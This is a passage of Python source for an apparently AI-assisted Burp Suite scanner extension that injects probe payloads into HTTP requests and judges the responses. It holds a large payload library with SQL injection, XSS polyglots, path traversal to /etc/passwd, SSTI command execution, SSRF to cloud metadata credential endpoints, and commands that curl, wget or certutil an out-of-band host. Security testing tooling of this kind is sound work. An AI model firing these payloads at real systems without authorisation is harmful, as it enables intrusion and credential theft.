                "confidence": 50,
                "payload": payload_candidates[0],
            }
            best_score = -1
            roundtrip_ms = 0
            attempts_sent = 0

            for candidate_payload in payload_candidates:
                modified_request = self._injectPayload(
                    req_str, candidate_payload, injection_point
                )
                if not modified_request:
                    continue

                attempts_sent += 1
                self.stdout.println("[VERIFY] Payload: %s" % candidate_payload[:120])
                started_at = time.time()
                verification_response = self.callbacks.makeHttpRequest(
                    httpService, self.helpers.stringToBytes(modified_request)
                )
                roundtrip_ms = int((time.time() - started_at) * 1000)

                ver_resp_bytes = verification_response.getResponse()
                if not ver_resp_bytes:
                    continue

                ver_resp_info = self.helpers.analyzeResponse(ver_resp_bytes)
                status_code = int(ver_resp_info.getStatusCode() or 0)
                ver_resp_str = self.helpers.bytesToString(ver_resp_bytes)

                blocked = self._looks_waf_blocked(status_code, ver_resp_str[:2000])
                if blocked and self.ENABLE_WAF_DETECTION and not waf_profile.get("detected"):
                    waf_profile = {
                        "detected": True,
                        "vendor": "Generic WAF",
                        "confidence": 60,
                        "signals": ["block-page"],
                        "status_code": status_code,
                    }
                    self._record_waf_profile(str(httpService.getHost() or ""), waf_profile)
                analysis_detection_method = detection_method
                if blocked:
                    analysis_detection_method = (
                        (detection_method + "; ") if detection_method else ""
                    ) + "WAF/block-page heuristics"

                result = self.analyze_verification_response(
                    title,
                    candidate_payload,
                    analysis_detection_method,
                    ver_resp_str[:4000],
                    roundtrip_ms,
                )

                candidate_status = result.get("status", "Uncertain")
                candidate_conf = result.get("confidence")
                try:
                    candidate_conf = int(candidate_conf)
                except Exception:
                    candidate_conf = 50

                status_weight = {
                    "Confirmed": 300,
                    "False Positive": 200,
                    "Uncertain": 100,
                    "Error": 0,
                }.get(candidate_status, 100)
                score = status_weight + candidate_conf
                if score > best_score:
                    best_score = score
                    best_result = {
                        "status": candidate_status,
                        "evidence": result.get("evidence", ""),
                        "confidence": candidate_conf,
                        "payload": candidate_payload,
                    }

                if candidate_status == "Confirmed":
                    break
                if candidate_status == "False Positive" and not blocked:
                    break

            if attempts_sent == 0:
                self._updateVerificationStatus(
                    findingIndex,
                    "Error",
                    "Could not inject payloads into request (injection_point=%s)"
                    % (injection_point if injection_point else "<auto>"),
                )
                return

            # If response evidence is inconclusive for OOB-prone issues, run collaborator probe.
            if (
                self.ENABLE_OOB_TESTING
                and best_result.get("status") != "Confirmed"
                and vuln_family in oob_families
            ):
                oob_result = self._run_oob_probe_for_message(
                    messageInfo,
                    injection_point=injection_point,
                    context_label="Verification",
                    poll_seconds=self.OOB_POLL_SECONDS,
                )
                if oob_result.get("detected"):
                    best_result["status"] = "Confirmed"
                    best_result["confidence"] = max(
                        95, int(best_result.get("confidence", 50))
                    )
                    best_result["evidence"] = (
                        (best_result.get("evidence", "") + " | ")
                        if best_result.get("evidence")
                        else ""
                    ) + oob_result.get("evidence", "Collaborator interaction observed")
                    if oob_result.get("payload"):
                        best_result["payload"] = oob_result.get("payload")
                elif oob_result.get("sent"):
                    best_result["evidence"] = (
                        (best_result.get("evidence", "") + " | ")
                        if best_result.get("evidence")
                        else ""
                    ) + oob_result.get(
                        "evidence", "OOB probe sent but no interaction observed"
                    )

            status = best_result.get("status", "Uncertain")
            evidence = str(best_result.get("evidence", "")).strip()
            confidence = best_result.get("confidence")
            payload = best_result.get("payload", payload)

            details = evidence or "No clear indicator found"
            if confidence is not None:
                details = "Confidence %s: %s" % (confidence, details)

            with self.findings_lock_ui:
                if findingIndex < len(self.findings_list):
                    self.findings_list[findingIndex]["verification_payload"] = payload
                    self.findings_list[findingIndex][
                        "verification_nonce"
                    ] = verification_nonce
                    self.findings_list[findingIndex][
                        "verification_injection_point"
                    ] = injection_point
                    self.findings_list[findingIndex][
                        "verification_response_time_ms"
                    ] = roundtrip_ms
                    self.findings_list[findingIndex][
                        "verification_attempts"
                    ] = attempts_sent
                    if waf_profile.get("detected"):
                        self.findings_list[findingIndex]["waf_vendor"] = waf_profile.get(
                            "vendor", "Generic WAF"
                        )
            self._ui_dirty = True

            self._updateVerificationStatus(findingIndex, status, details)

            self.stdout.println("[VERIFY] Result: %s" % status)
            self.stdout.println("[VERIFY] Response Time: %d ms" % roundtrip_ms)
            if evidence:
                self.stdout.println("[VERIFY] Evidence: %s" % evidence[:220])

        except Exception as e:
            self.stderr.println("[!] Verification error: %s" % str(e))
            self._updateVerificationStatus(findingIndex, "Error", str(e))

    def _updateVerificationStatus(self, findingIndex, status, details=""):
        """Update the verification status of a finding"""
        normalized_status = self._normalizeVerificationStatus(status)
        with self.findings_lock_ui:
            if findingIndex < len(self.findings_list):
                self.findings_list[findingIndex]["verified"] = normalized_status
                self.findings_list[findingIndex]["verification_details"] = details
        self._ui_dirty = True
        self.stdout.println("[VERIFY] Status updated: %s" % normalized_status)
        if details:
            self.stdout.println("[VERIFY] Details: %s" % str(details)[:300])
        if normalized_status == "Error" and details:
            self.stderr.println("[VERIFY][ERROR] %s" % str(details))

    def build_verification_prompt(
        self,
        vuln_title,
        vuln_details,
        request,
        response,
        finding_context=None,
        vuln_family="generic",
        verification_nonce="",
    ):
        """Build verification prompt for AI-guided PoC generation."""
        param_hint = ""
        if isinstance(vuln_details, dict) and vuln_details.get("param_name"):
            param_hint = str(vuln_details.get("param_name"))

        if not finding_context:
            finding_context = {}

        return (
            "You are a penetration testing expert. Generate a SAFE verification payload.\n"
            "Only provide detection-oriented payloads. Never provide destructive actions.\n\n"
            "Verification nonce (must be preserved exactly): %s\n"
            "Expected vulnerability family: %s\n\n"
            "Vulnerability: %s\n"
            "Structured details: %s\n"
            "Finding context: %s\n"
            "Preferred parameter: %s\n\n"
            "Original HTTP request (truncated):\n%s\n\n"
            "Original HTTP response snippet:\n%s\n\n"
            "Output ONLY valid JSON with this exact shape:\n"
            '{"payload":"...","injection_point":"param_or_header","detection_method":"...",'
            '"safe":true,"payload_family":"...","verification_nonce":"%s"}\n'
            "Guidance:\n"
            "- payload_family must match expected family when possible\n"
            "- payload should be specific to this finding, URL, and parameter\n"
            "- Include the exact verification nonce in payload when syntax allows\n"
            "- Use harmless markers and clear detection logic\n"
            "- For time-based checks, use short delays (2-3 seconds)\n"
            "- If no obvious parameter exists, choose best candidate from request\n"
        ) % (
            verification_nonce or "scv-default",
            vuln_family,
            vuln_title,
            json.dumps(vuln_details, sort_keys=True),
            json.dumps(finding_context, sort_keys=True),
            param_hint or "<auto>",
            request[:2000],
            response[:1200],
            verification_nonce or "scv-default",
        )

    def _buildVerificationPrompt(self, vuln_title, vuln_details, request, response):
        """Backward-compatible wrapper."""
        return self.build_verification_prompt(vuln_title, vuln_details, request, response)

    def analyze_verification_response(
        self, vuln_title, payload, detection_method, response, response_time_ms=None
    ):
        """Analyze verification response and return status/evidence/confidence."""
        analysis_prompt = self._buildAnalysisPrompt(
            vuln_title, payload, detection_method, response, response_time_ms
        )
        self.stdout.println("[VERIFY] Analyzing response...")
        ai_response = self.ask_ai(analysis_prompt)

        if ai_response:
            parsed = self._parseVerificationResult(ai_response)
        else:
            parsed = {
                "status": "Uncertain",
                "evidence": "AI analysis did not return a result",
                "confidence": 50,
            }

        heuristic = self._heuristicVerificationResult(
            payload, detection_method, response, response_time_ms
        )

        if parsed.get("status") == "Uncertain" and heuristic.get("status") != "Uncertain":
            return heuristic

        if not parsed.get("evidence") and heuristic.get("evidence"):
            parsed["evidence"] = heuristic.get("evidence")

        if parsed.get("confidence") is None and heuristic.get("confidence") is not None:
            parsed["confidence"] = heuristic.get("confidence")

        return parsed

    def _buildAnalysisPrompt(
        self, vuln_title, payload, detection_method, response, response_time_ms=None
    ):
        """Build prompt for AI to analyze verification response"""
        timing_line = ""
        if response_time_ms is not None:
            timing_line = "Observed response time (ms): %d\n" % int(response_time_ms)

        return (
            "Analyze this HTTP response to determine verification outcome.\n\n"
            "Vulnerability: %s\n"
            "Payload sent: %s\n"
            "Detection method: %s\n"
            "%s\n"
            "Response:\n%s\n\n"
            "Output ONLY valid JSON:\n"
            '{"status":"Confirmed|False Positive|Uncertain",'
            '"evidence":"specific evidence from response",'
            '"confidence":0-100}\n'
            "Status rules:\n"
            "- Confirmed: clear, direct vulnerability evidence\n"
            "- False Positive: payload blocked/sanitized/escaped safely\n"
            "- Uncertain: evidence is ambiguous\n"
        ) % (vuln_title, payload, detection_method, timing_line, response)

    def _parseVerificationPayload(self, ai_response):
        """Parse AI response for verification payload"""
        parsed = self._extract_json_object(ai_response)
        if not isinstance(parsed, dict):
            return None

        # Allow either a single payload object or a payloads array.
        if not parsed.get("payload") and isinstance(parsed.get("payloads"), list):
            for candidate in parsed.get("payloads"):
                if isinstance(candidate, dict) and candidate.get("payload"):
                    parsed = candidate
                    break

        payload = str(parsed.get("payload", "")).strip()
        if not payload:
            return None

        safe_value = parsed.get("safe", True)
        if isinstance(safe_value, basestring):
            safe_value = safe_value.strip().lower() in ["true", "1", "yes", "safe"]

        return {
            "payload": payload,
            "injection_point": str(parsed.get("injection_point", "")).strip(),
            "detection_method": str(parsed.get("detection_method", "")).strip(),
            "safe": bool(safe_value),
            "payload_family": str(parsed.get("payload_family", "")).strip(),
            "verification_nonce": str(parsed.get("verification_nonce", "")).strip(),
        }

    def _inferVerificationFamily(self, vuln_title, vuln_details):
        text_parts = [str(vuln_title or "").lower()]
        if isinstance(vuln_details, dict):
            text_parts.append(str(vuln_details.get("detail", "")).lower())
            text_parts.append(str(vuln_details.get("cwe", "")).lower())
            text_parts.append(str(vuln_details.get("owasp", "")).lower())

        text = " ".join(text_parts)

        if "xss" in text or "cross site scripting" in text:
            return "xss"
        if "sql" in text or "sqli" in text or "cwe-89" in text:
            return "sqli"
        if "command injection" in text or "os command" in text or "cwe-78" in text:
            return "command_injection"
        if "path traversal" in text or "directory traversal" in text or "cwe-22" in text:
            return "path_traversal"
        if "ssrf" in text or "server side request forgery" in text or "cwe-918" in text:
            return "ssrf"
        if "template injection" in text or "ssti" in text:
            return "ssti"
        return "generic"

    def _buildVerificationNonce(self, findingIndex, url, title, vuln_details):
        source = "%s|%s|%s|%s" % (
            str(findingIndex),
            str(url or ""),
            str(title or ""),
            json.dumps(vuln_details or {}, sort_keys=True),
        )
        try:
            source_bytes = source.encode("utf-8")
        except:
            source_bytes = str(source)
        digest = hashlib.md5(source_bytes).hexdigest()[:8]
        return "scv-%s" % digest

    def _decoratePayloadWithNonce(self, payload, vuln_family, verification_nonce):
        payload = str(payload or "").strip()
        if not payload or not verification_nonce:
            return payload
        if verification_nonce in payload:
            return payload

        if vuln_family == "sqli":
            return "%s/*%s*/" % (payload, verification_nonce)
        if vuln_family == "command_injection":
            return "%s # %s" % (payload, verification_nonce)
        if vuln_family in ["xss", "ssti", "generic"]:
            return "%s%s" % (payload, verification_nonce)
        return payload

    def _parseVerificationResult(self, ai_response):
        """Parse AI response for verification result"""
        parsed = self._extract_json_object(ai_response)
        if not isinstance(parsed, dict):
            return {
                "status": "Uncertain",
                "evidence": "Could not parse AI verification analysis",
                "confidence": 50,
            }

        confidence = parsed.get("confidence")
        try:
            confidence = int(float(confidence))
        except:
            confidence = None

        return {
            "status": self._normalizeVerificationStatus(parsed.get("status")),
            "evidence": str(parsed.get("evidence", "")).strip(),
            "confidence": confidence,
        }

    def _extract_json_object(self, text):
        if not text:
            return None

        cleaned = str(text).strip()
        try:
            parsed = json.loads(cleaned)
            if isinstance(parsed, dict):
                return parsed
            if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict):
                return parsed[0]
        except:
            pass

        starts = [idx for idx, ch in enumerate(cleaned) if ch == "{"]
        for start_idx in starts:
            depth = 0
            for i in xrange(start_idx, len(cleaned)):
                ch = cleaned[i]
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        candidate = cleaned[start_idx : i + 1]
                        try:
                            parsed = json.loads(candidate)
                            if isinstance(parsed, dict):
                                return parsed
                        except:
                            break
        return None

    def _normalizeVerificationStatus(self, status):
        normalized = str(status or "").strip().lower()
        if not normalized:
            return "Uncertain"
        if "confirm" in normalized or normalized in ["true", "vulnerable"]:
            return "Confirmed"
        if "false positive" in normalized or normalized in [
            "false",
            "not vulnerable",
            "safe",
        ]:
            return "False Positive"
        if "error" in normalized:
            return "Error"
        if "verifying" in normalized:
            return "Verifying..."
        if "pending" in normalized:
            return "Pending"
        return "Uncertain"

    def _looks_like_http_request_block(self, text):
        value = str(text or "").lstrip()
        first_line = value.splitlines()[0] if value else ""
        methods = ["GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "OPTIONS ", "HEAD "]
        for method in methods:
            if first_line.startswith(method):
                return True
        if "\nHost:" in value or "\r\nHost:" in value:
            return True
        return False

    def _isHeaderInjectionPoint(self, injection_point):
        point = str(injection_point or "").strip().lower()
        if not point:
            return False
        if "header" in point:
            return True
        if point.startswith("x-"):
            return True
        if point in [
            "host",
            "cookie",
            "authorization",
            "user-agent",
            "referer",
            "origin",
            "accept",
            "content-type",
        ]:
            return True
        if ":" in point and "=" not in point:
            return True
        return False

    def _normalizeHeaderInjectionPoint(self, injection_point):
        point = str(injection_point or "").strip()
        generic = [
            "",
            "header",
            "headers",
            "http_header",
            "request_header",
            "any_header",
            "all_headers",
        ]
        lowered = point.lower()
        if lowered in generic:
            return "X-Code-AIxBurp-Verify"
        if ":" in point and "=" not in point:
            point = point.split(":", 1)[0].strip()
        if point.lower() == "host":
            return "X-Code-AIxBurp-Verify"
        if not point:
            return "X-Code-AIxBurp-Verify"
        return point

    def _heuristicVerificationResult(
        self, payload, detection_method, response, response_time_ms=None
    ):
        response_text = str(response or "")
        lowered = response_text.lower()

        marker = str(payload or "").strip().lower()
        if marker and len(marker) >= 6 and marker in lowered:
            return {
                "status": "Confirmed",
                "evidence": "Payload marker was reflected in the response body",
                "confidence": 85,
            }

        if (
            response_time_ms is not None
            and response_time_ms >= 2500
            and "time" in str(detection_method or "").lower()
        ):
            return {
                "status": "Confirmed",
                "evidence": "Observed delayed response (%d ms) for time-based payload"
                % int(response_time_ms),
                "confidence": 80,
            }

        block_markers = [
            "access denied",
            "request blocked",
            "blocked by waf",
            "forbidden",
            "malicious input",
            "input rejected",
        ]
        for marker in block_markers:
            if marker in lowered:
                return {
                    "status": "False Positive",
                    "evidence": "Application appears to reject or sanitize malicious input",
                    "confidence": 70,
                }

        return {
            "status": "Uncertain",
            "evidence": "No deterministic verification indicator found in response",
            "confidence": 50,
        }

    def _replaceParamValue(self, text, param_name, encoded_payload, is_query):
        import re

        if not text:
            return text, False

        if param_name:
            if is_query:
                pattern = r"([?&]%s=)([^&\s]*)" % re.escape(param_name)
            else:
                pattern = r"((?:^|&)%s=)([^&\r\n]*)" % re.escape(param_name)

            updated, count = re.subn(pattern, r"\1" + encoded_payload, text, 1)
            if count > 0:
                return updated, True

        if is_query:
            fallback = r"([?&][^=&\s]+)=([^&\s]*)"
        else:
            fallback = r"((?:^|&)[^=&\r\n]+)=([^&\r\n]*)"

        updated, count = re.subn(fallback, r"\1=" + encoded_payload, text, 1)
        return updated, count > 0

    def _updateContentLength(self, headers, body):
        body_len = len(body or "")
        for header in headers:
            lower_header = header.lower()
            if lower_header.startswith("transfer-encoding:") and "chunked" in lower_header:
                return headers

        updated_headers = []
        found = False
        for header in headers:
            if header.lower().startswith("content-length:"):
                updated_headers.append("Content-Length: %d" % body_len)
                found = True
            else:
                updated_headers.append(header)

        if not found:
            updated_headers.append("Content-Length: %d" % body_len)

        return updated_headers

    def _injectHeaderValue(self, headers, header_name, payload):
        normalized_name = self._normalizeHeaderInjectionPoint(header_name)
        header_value = str(payload or "").replace("\r", " ").replace("\n", " ").strip()
        if not header_value:
            return headers, False

        replaced = False
        updated_headers = []
        prefix = normalized_name.lower() + ":"

        for header in headers:
            if header.lower().startswith(prefix) and not replaced:
                updated_headers.append("%s: %s" % (normalized_name, header_value))
                replaced = True
            else:
                updated_headers.append(header)

        if not replaced:
            updated_headers.append("%s: %s" % (normalized_name, header_value))

        return updated_headers, True

    def _injectPayload(self, request, payload, injection_point):
        """Inject payload into request at specified injection point"""
        try:
            if not request or not payload:
                return None

            import urllib

            encoded_payload = urllib.quote_plus(str(payload))
            has_body = "\r\n\r\n" in request

            if has_body:
                header_block, body = request.split("\r\n\r\n", 1)
            else:
                header_block = request
                body = ""

            header_lines = header_block.split("\r\n")
            if not header_lines:
                return None

            request_line = header_lines[0]
            headers = header_lines[1:]
            modified = False
            body_modified = False
            is_header_point = self._isHeaderInjectionPoint(injection_point)

            if is_header_point:
                headers, changed_header = self._injectHeaderValue(
                    headers, injection_point, payload
                )
                if changed_header:
                    modified = True

            if not is_header_point:
                request_parts = request_line.split(" ")
                if len(request_parts) >= 2:
                    original_target = request_parts[1]
                    updated_target, changed_target = self._replaceParamValue(
                        original_target, injection_point, encoded_payload, True
                    )
                    if changed_target:
                        request_parts[1] = updated_target
                        request_line = " ".join(request_parts)
                        modified = True

            content_type = ""
            for header in headers:
                if header.lower().startswith("content-type:"):
                    content_type = header.lower()
                    break

            if (
                not is_header_point
                and body
                and ("application/x-www-form-urlencoded" in content_type or "=" in body)
            ):
                updated_body, changed_body = self._replaceParamValue(
                    body, injection_point, encoded_payload, False
                )
                if changed_body:
                    body = updated_body
                    modified = True
                    body_modified = True

            if not modified:
                return None

            if body_modified:
                headers = self._updateContentLength(headers, body)

            rebuilt_headers = "\r\n".join([request_line] + headers)
            if has_body:
                return rebuilt_headers + "\r\n\r\n" + body
            return rebuilt_headers + "\r\n\r\n"
        except Exception as e:
            self.stderr.println("[!] Payload injection error: %s" % str(e))
            return None

    def _build_advanced_payload_library(self):
        return {
            "sqli": [
                "' OR '1'='1",
                "\" OR 1=1--",
                "' OR '1'='1'-- -",
                "') OR ('1'='1",
                "' UNION SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' ORDER BY 1--",
                "' ORDER BY 100--",
                "' AND SLEEP(2)--",
                "' AND BENCHMARK(2000000,MD5(1))--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(2))a)--",
                "';SELECT pg_sleep(2)--",
                "' OR 1=(SELECT 1 FROM pg_sleep(2))--",
                "';WAITFOR DELAY '0:0:2'--",
                "' OR 1=1;WAITFOR DELAY '0:0:2'--",
                "' AND 1=(SELECT 1 FROM dual)--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
            ],
            "sqli_mysql": [
                "' AND SLEEP(2)--",
                "' AND IF(1=1,SLEEP(2),0)--",
                "' UNION SELECT @@version,NULL--",
                "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))--",
            ],
            "sqli_postgresql": [
                "';SELECT pg_sleep(2)--",
                "' UNION SELECT version(),NULL--",
                "' OR EXISTS(SELECT 1 FROM pg_sleep(2))--",
            ],
            "sqli_mssql": [
                "';WAITFOR DELAY '0:0:2'--",
                "' OR 1=1;WAITFOR DELAY '0:0:2'--",
                "' UNION SELECT @@version,NULL--",
            ],
            "sqli_oracle": [
                "' AND 1=(SELECT 1 FROM dual)--",
                "' UNION SELECT banner,NULL FROM v$version--",
                "'||UTL_INADDR.GET_HOST_ADDRESS('{{OOB_DOMAIN}}')||'",
            ],
            "sqli_sqlite": [
                "' AND 1=(SELECT 1 FROM sqlite_master LIMIT 1)--",
                "' UNION SELECT sqlite_version(),NULL--",
            ],
            "sqli_json": [
                "\" OR 1=1--",
                "\" AND SLEEP(2)--",
                "\\\" OR \\\"1\\\"=\\\"1",
            ],
            "sqli_polyglot": [
                "SLEEP(1) /*' or SLEEP(1) or'\" or SLEEP(1) or \"*/",
                "'/**/OR/**/1=1/**/--/**/",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
            ],
            "xss": [
                "<script>confirm(1)</script>",
                "\"><img src=x onerror=confirm(1)>",
                "<svg/onload=confirm(1)>",
                "';confirm(1);//",
                "\"><body onload=confirm(1)>",
                "</script><script>confirm(1)</script>",
                "<img src=1 onerror=confirm(document.domain)>",
                "'\"><svg><script>confirm(1)</script>",
            ],
            "xss_json": [
                "\\u003cscript\\u003econfirm(1)\\u003c/script\\u003e",
                "\\x3csvg/onload=confirm(1)\\x3e",
                "\"</script><script>confirm(1)</script>",
            ],
            "xss_attr": [
                "\" autofocus onfocus=confirm(1) x=\"",
                "' onmouseover='confirm(1)' x='",
            ],
            "xss_polyglot": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
                "\"><script>alert(1)</script>",
                "'><img src=x onerror=alert(1)>",
                "'\";!--\"<XSS>=&{()}",
                "';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "'\"><marquee><img src=x onerror=confirm(1)></marquee></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script><isindex formaction=javascript:alert(/XSS/) type=submit>",
                "\"onclick=alert(1)//<button' onclick=alert(1)//>*/alert(1)//",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*<svg/*/onload=alert()//>",
                "javascript:alert()//'/*`/*\"/**/;alert()//%0D%0A-->'>\"></title></textarea></style></noscript></noembed></template></select><svg/oNloAd=alert()><FRAME onload=alert()></script>\\\";alert()//<svg/oNloAd=alert()>",
            ],
            "command_injection": [
                "; id",
                "| whoami",
                "&& id",
                "`id`",
                "$(id)",
                "; uname -a",
                "&& echo scv_cmd",
                "|| ping -c 1 {{OOB_DOMAIN}}",
                "| nslookup {{OOB_DOMAIN}}",
            ],
            "command_injection_unix": [
                ";cat /etc/passwd",
                ";sleep 2",
                "${IFS}id",
                "$(nslookup {{OOB_DOMAIN}})",
            ],
            "command_injection_windows": [
                "& whoami",
                "& ver",
                "& type C:\\Windows\\win.ini",
                "& ping -n 1 {{OOB_DOMAIN}}",
                "| powershell -c \"nslookup {{OOB_DOMAIN}}\"",
            ],
            "command_injection_oob": [
                "&& curl http://{{OOB_DOMAIN}}/{{NONCE}}",
                "&& wget http://{{OOB_DOMAIN}}/{{NONCE}} -O /tmp/scv",
                "& certutil -urlcache -split -f http://{{OOB_DOMAIN}}/{{NONCE}} x",
            ],
            "path_traversal": [
                "../../../../etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\..\\windows\\win.ini",
                "..%252f..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "....//....//....//etc/passwd",
            ],
            "path_traversal_unix": [
                "../../../../proc/self/environ",
                "../../../../var/log/auth.log",
            ],
            "path_traversal_windows": [
                "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
            ],
            "path_traversal_api": [
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
                "..%2f..%2f..%2f..%2fwindows%2fwin.ini%00",
            ],
            "ssrf": [
                "http://127.0.0.1:80/",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/metadata/instance",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://100.100.100.200/latest/meta-data/",
                "http://[::1]/",
                "http://{{OOB_DOMAIN}}/ssrf",
                "https://{{OOB_DOMAIN}}/{{NONCE}}",
            ],
            "ssrf_cloud": [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://169.254.169.254/metadata/identity/oauth2/token",
            ],
            "ssrf_oob": [
                "http://{{OOB_DOMAIN}}/{{NONCE}}",
                "https://{{OOB_DOMAIN}}/{{NONCE}}",
                "dns://{{OOB_DOMAIN}}",
            ],
            "ssrf_gopher": [
                "gopher://127.0.0.1:6379/_PING",
                "gopher://127.0.0.1:11211/_stats",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{7*'7'}}",
                "${{7*7}}",
            ],
            "ssti_jinja2": [
                "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
                "{{ config.items() }}",
            ],
            "ssti_twig": [
                "{{7*7}}",
                "{{_self}}",
            ],
            "ssti_freemarker": [
                "${7*7}",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            ],
            "ssti_velocity": [
                "#set($x=7*7)$x",
                "#set($str=$class.inspect(\"java.lang.String\").type)",
            ],
            "ssti_erb": [
                "<%= 7*7 %>",
                "<%= ENV.to_h %>",
            ],
            "ssti_polyglot": [
                "${{<%[%'\"}}%\\",
                "{{7*7}}${7*7}<%=7*7%>#{7*7}",
            ],
            "generic": [
                "scv-probe-{{NONCE}}",
                "'\"`<scv-{{NONCE}}>",
                "../../../../../",
                "{{7*7}}",
                "\";print('{{NONCE}}');//",
                "%3Cscv%3E{{NONCE}}%3C/scv%3E",
            ],
            "generic_polyglot": [
                "'-\"#*/",
            ],
        }

    def _get_library_payloads_for_family(self, vuln_family, target_profile=None):
        library = self.advanced_payload_library or {}
        generic = list(library.get("generic", []))
        specific = list(library.get(vuln_family, []))
        family_polyglot = list(library.get(vuln_family + "_polyglot", []))
        generic_polyglot = list(library.get("generic_polyglot", []))
        context_specific = []

        if not target_profile:
            target_profile = {}

        dbms = str(target_profile.get("dbms", "")).strip().lower()
        stack = str(target_profile.get("stack", "")).strip().lower()
        os_hint = str(target_profile.get("os", "")).strip().lower()

        if vuln_family == "sqli" and dbms:
            context_specific.extend(list(library.get("sqli_" + dbms, [])))

        if vuln_family == "xss" and target_profile.get("is_json"):
            context_specific.extend(list(library.get("xss_json", [])))
        if vuln_family == "xss" and target_profile.get("is_attr_context"):
            context_specific.extend(list(library.get("xss_attr", [])))

        if vuln_family == "command_injection":
            context_specific.extend(list(library.get("command_injection_oob", [])))
            if os_hint == "windows":
                context_specific.extend(
                    list(library.get("command_injection_windows", []))
                )
            else:
                context_specific.extend(list(library.get("command_injection_unix", [])))

        if vuln_family == "path_traversal":
            if os_hint == "windows":
                context_specific.extend(list(library.get("path_traversal_windows", [])))
            else:
                context_specific.extend(list(library.get("path_traversal_unix", [])))
            if target_profile.get("is_api"):
                context_specific.extend(list(library.get("path_traversal_api", [])))

        if vuln_family == "ssrf":
            context_specific.extend(list(library.get("ssrf_oob", [])))
            if target_profile.get("cloud_hint"):
                context_specific.extend(list(library.get("ssrf_cloud", [])))
            if target_profile.get("is_internal_service_target"):
                context_specific.extend(list(library.get("ssrf_gopher", [])))

        if vuln_family == "ssti" and stack:
            stack_key_map = {
                "jinja2": "ssti_jinja2",
                "twig": "ssti_twig",
                "freemarker": "ssti_freemarker",
                "velocity": "ssti_velocity",
                "erb": "ssti_erb",
            }
            stack_key = stack_key_map.get(stack)
            if stack_key:
                context_specific.extend(list(library.get(stack_key, [])))

        if vuln_family == "generic":
            return family_polyglot + generic + generic_polyglot
        return context_specific + specific + family_polyglot + generic + generic_polyglot

    def _replace_payload_placeholders(self, payload, verification_nonce="", oob_domain=""):
        value = str(payload or "")
        if verification_nonce:
            value = value.replace("{{NONCE}}", verification_nonce)
        else:
            value = value.replace("{{NONCE}}", "scv")
        replacement_domain = str(oob_domain or "oob.invalid")
        value = value.replace("{{OOB_DOMAIN}}", replacement_domain)
        return value

    def _normalize_payload_candidates(self, payloads, limit=12):
        normalized = []
        seen = set()
        for payload in payloads:
            value = str(payload or "").strip()
            if not value:
                continue
            if value in seen:
                continue
            seen.add(value)
            normalized.append(value)
            if len(normalized) >= int(limit):
                break
        return normalized

    def _build_target_profile(
        self, request_text, response_text="", vuln_family="generic", injection_point=""
    ):
        request_value = str(request_text or "")
        response_value = str(response_text or "")
        combined = (request_value + "\n" + response_value).lower()
        request_lower = request_value.lower()
        response_lower = response_value.lower()

        request_line = request_value.split("\r\n", 1)[0] if request_value else ""
        method = ""
        target = ""
        if request_line:
            parts = request_line.split(" ")
            if len(parts) >= 2:
                method = parts[0].upper()
                target = parts[1]

        injection_name = str(injection_point or "").lower()

        dbms_patterns = {
            "mysql": [
                "mysql",
                "mariadb",
                "sql syntax",
                "sqlstate[42000]",
                "you have an error in your sql syntax",
            ],
            "postgresql": [
                "postgresql",
                "pg_sleep",
                "pg_query",
                "psqlexception",
                "org.postgresql",
            ],
            "mssql": [
                "sql server",
                "microsoft ole db provider for sql server",
                "odbc sql server driver",
                "unclosed quotation mark",
                "waitfor delay",
            ],
            "oracle": [
                "ora-",
                "oracle",
                "from dual",
                "utl_http",
                "utl_inaddr",
            ],
            "sqlite": [
                "sqlite",
                "sqlite_exception",
                "sqlite3::sqlexception",
                "sqlite_master",
            ],
        }

        dbms = ""
        dbms_score = 0
        for db, markers in dbms_patterns.items():
            hits = 0
            for marker in markers:
                if marker in combined:
                    hits += 1
            if hits > dbms_score:
                dbms_score = hits
                dbms = db

        stack_patterns = {
            "jinja2": ["jinja2", "werkzeug", "flask", "{{ config"],
            "twig": ["twig", "symfony", "php warning"],
            "freemarker": ["freemarker", "spring", "java.lang"],
            "velocity": ["velocity", "org.apache.velocity"],
            "erb": ["rails", "ruby", "actionview", "<%="],
        }

        stack = ""
        stack_score = 0
        for stack_name, markers in stack_patterns.items():
            hits = 0
            for marker in markers:
                if marker in combined:
                    hits += 1
            if hits > stack_score:
                stack_score = hits
                stack = stack_name

        if (
            vuln_family == "ssti"
            and not stack
            and ("spring" in combined or "jsessionid" in combined)
        ):
            stack = "freemarker"

        os_hint = "unix"
        if (
            "windows" in combined
            or "microsoft-iis" in combined
